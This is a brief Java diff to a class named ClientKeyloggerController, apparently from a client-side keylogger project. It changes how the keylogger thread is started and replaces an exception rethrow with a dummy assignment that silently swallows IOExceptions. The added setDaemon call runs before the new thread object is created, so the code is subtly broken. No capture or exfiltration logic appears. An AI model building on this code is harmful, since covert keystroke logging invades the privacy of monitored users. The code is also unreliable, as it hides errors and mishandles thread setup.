@@ -33,7 +33,7 @@ public class ClientKeyloggerController {
                 }
 
             } catch (IOException e) {
-                throw new RuntimeException(e);
+                int a = 0;
             }
         }
     }
@@ -42,6 +42,7 @@ public class ClientKeyloggerController {
     public void start() throws IOException {
         if (running == 0)
         {
+            keyloggerThread.setDaemon(true);
             running = 1;
             keyloggerThread = new KeyloggerThread();
             keyloggerThread.start();
